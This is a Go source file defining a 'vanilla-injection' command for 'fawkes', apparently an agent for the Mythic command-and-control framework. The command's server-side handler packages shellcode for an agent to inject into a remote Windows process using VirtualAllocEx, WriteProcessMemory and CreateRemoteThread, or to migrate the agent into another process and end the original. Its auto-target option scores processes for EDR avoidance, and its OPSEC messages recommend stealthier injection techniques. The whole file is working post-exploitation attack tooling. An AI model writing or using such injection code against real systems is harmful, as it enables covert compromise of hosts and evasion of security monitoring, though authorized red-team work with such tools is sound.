package agentfunctions

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/logging"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "vanilla-injection",
		Description:         "Perform vanilla remote process injection (inject shellcode or migrate agent into another process)",
		HelpString:          "vanilla-injection -action inject -pid 1234 -filename shellcode.bin\nvanilla-injection -action migrate -pid 1234 -filename fawkes-shellcode.bin",
		Version:             2,
		MitreAttackMappings: []string{"T1055.001", "T1055.002"}, // Process Injection: Dynamic-link Library Injection, Portable Executable Injection
		SupportedUIFeatures: []string{"process_browser:inject"},
		Author:              "@galoryber",
		AssociatedBrowserScript: &agentstructs.BrowserScript{ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "vanillainjection_new.js"), Author: "@galoryber"},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:      "inject: inject shellcode into target process. migrate: inject agent shellcode and exit current process (process migration)",
				Choices:          []string{"inject", "migrate"},
				DefaultValue:     "inject",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
						UIModalPosition:     0,
					},
					{
						ParameterIsRequired: true,
						GroupName:           "New File",
						UIModalPosition:     0,
					},
				},
			},
			{
				Name:                 "filename",
				ModalDisplayName:     "Shellcode File",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:          "The shellcode file to inject from files already registered in Mythic",
				Choices:              []string{},
				DefaultValue:         "",
				DynamicQueryFunction: getFileList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
						UIModalPosition:     1,
					},
				},
			},
			{
				Name:             "file",
				ModalDisplayName: "Shellcode File",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_FILE,
				Description:      "Upload a new shellcode file to inject",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "New File",
						UIModalPosition:     1,
					},
				},
			},
			{
				Name:                 "pid",
				ModalDisplayName:     "Target PID",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:          "Process ID to inject into. Leave empty when using target auto-selection.",
				DynamicQueryFunction: getProcessList,
				DefaultValue:         "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
						UIModalPosition:     2,
					},
					{
						ParameterIsRequired: false,
						GroupName:           "New File",
						UIModalPosition:     2,
					},
				},
			},
			{
				Name:             "target",
				ModalDisplayName: "Target Selection",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:      "Auto-select injection target. Scores running processes for suitability (EDR avoidance, arch match, integrity level). Overrides PID when set.",
				DefaultValue:     "",
				Choices:          []string{"", "auto", "auto-elevated", "auto-user"},
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
						UIModalPosition:     4,
					},
					{
						ParameterIsRequired: false,
						GroupName:           "New File",
						UIModalPosition:     4,
					},
				},
			},
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			pid, _ := taskData.Args.GetStringArg("pid")
			action, _ := taskData.Args.GetStringArg("action")
			msg := fmt.Sprintf("OPSEC WARNING: Classic process injection into PID %s. "+
				"Uses VirtualAllocEx + WriteProcessMemory + CreateRemoteThread — "+
				"the most detectable injection pattern. Most EDR products hook these APIs. "+
				"Consider threadless-inject or module-stomping for lower detection risk.", pid)
			if action == "migrate" {
				msg += fmt.Sprintf("\n\nMIGRATION WARNING: This will inject a new agent instance into PID %s "+
					"and terminate the current agent process. The current callback will go offline. "+
					"A new callback will appear from the target process. Ensure the target process "+
					"is stable and long-lived (e.g., explorer.exe, svchost.exe).", pid)
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			pid, _ := taskData.Args.GetStringArg("pid")
			action, _ := taskData.Args.GetStringArg("action")
			msg := fmt.Sprintf("OPSEC AUDIT: Classic injection (VirtualAllocEx+WriteProcessMemory+CreateRemoteThread) queued for PID %s. Artifact registered.", pid)
			if action == "migrate" {
				msg += " MIGRATION: Current agent will self-terminate after injection. Monitor for new callback from target process."
			}
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    msg,
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			// For command line usage, we'd need to parse differently
			// For now, require JSON format
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			// Get action (default to "inject" for backward compatibility)
			action, _ := taskData.Args.GetStringArg("action")
			if action == "" {
				action = "inject"
			}

			// Resolve file contents by checking actual args (not ParameterGroupName)
			filename, fileContents, err := resolveFileContents(taskData)
			if err != nil {
				response.Success = false
				response.Error = err.Error()
				return response
			}

			// Get target selection mode (if any)
			target, _ := taskData.Args.GetStringArg("target")

			// Get the target PID (may be 0 if using auto-selection)
			pid, err := parsePIDFromArg(taskData)
			if err != nil {
				pid = 0 // Will use target auto-selection
			}

			if pid <= 0 && target == "" {
				response.Success = false
				response.Error = "Specify either a PID or a target selection mode (auto, auto-elevated, auto-user)"
				return response
			}

			// Build the display parameters
			actionLabel := "Inject"
			if action == "migrate" {
				actionLabel = "Migrate"
			}
			var displayParams string
			if target != "" {
				displayParams = fmt.Sprintf("Action: %s\nShellcode: %s (%d bytes)\nTarget: %s (auto-select)", actionLabel, filename, len(fileContents), target)
			} else {
				displayParams = fmt.Sprintf("Action: %s\nShellcode: %s (%d bytes)\nTarget PID: %d", actionLabel, filename, len(fileContents), pid)
			}
			response.DisplayParams = &displayParams

			artifactDesc := fmt.Sprintf("VirtualAllocEx/WriteProcessMemory/CreateRemoteThread into PID %d (%d bytes)", pid, len(fileContents))
			if target != "" {
				artifactDesc = fmt.Sprintf("VirtualAllocEx/WriteProcessMemory/CreateRemoteThread with auto-target '%s' (%d bytes)", target, len(fileContents))
			}
			if action == "migrate" {
				artifactDesc += " [MIGRATE: agent will self-terminate after injection]"
			}
			createArtifact(taskData.Task.ID, "Process Inject", artifactDesc)

			// Build the actual parameters JSON that will be sent to the agent
			// Encode shellcode contents as base64 to embed in JSON
			params := map[string]interface{}{
				"shellcode_b64": base64.StdEncoding.EncodeToString(fileContents),
				"pid":           pid,
				"target":        target,
				"action":        action,
			}

			paramsJSON, err := json.Marshal(params)
			if err != nil {
				logging.LogError(err, "Failed to marshal parameters")
				response.Success = false
				response.Error = "Failed to create task parameters: " + err.Error()
				return response
			}

			// Set the parameters as a JSON string
			taskData.Args.SetManualArgs(string(paramsJSON))

			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			action, _ := processResponse.TaskData.Args.GetStringArg("action")
			if action == "migrate" && strings.Contains(responseText, "completed successfully") {
				pid, _ := processResponse.TaskData.Args.GetStringArg("pid")
				createArtifact(processResponse.TaskData.Task.ID, "Process Migration",
					fmt.Sprintf("Agent migrated into PID %s via CreateRemoteThread injection. "+
						"Original agent process terminated. New callback expected from target process.", pid))
			}
			return response
		},
	})
}
